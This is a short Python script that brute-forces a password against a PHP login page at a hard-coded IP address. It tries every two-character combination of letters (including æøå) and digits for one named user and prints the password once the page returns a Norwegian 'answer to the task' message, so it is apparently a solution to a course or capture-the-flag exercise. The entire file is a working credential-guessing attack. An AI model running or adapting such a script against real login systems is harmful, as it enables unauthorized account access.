import requests

url = 'http://158.39.188.211/functions/passcheck10.php'
username = 'tomhnatt'

feil_r = requests.post(url, {"username": username, "password": "something"})
response = requests.get('http://158.39.188.211/functions/passcheck10.php')

def send_request(username, password):
    data = {'username': username, 'password': password}

    r = requests.post(url, data=data)
    if 'Svaret på oppgaven er:' in r.content.decode('utf-8'):
        print(password)
        print(r.text)


chars = "abcdefghijklmnopqrstuvwxyzæøå0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZÆØÅ"

for i in chars:
    print(i)
    for j in chars:
        send_request("tomhnatt", i + j)

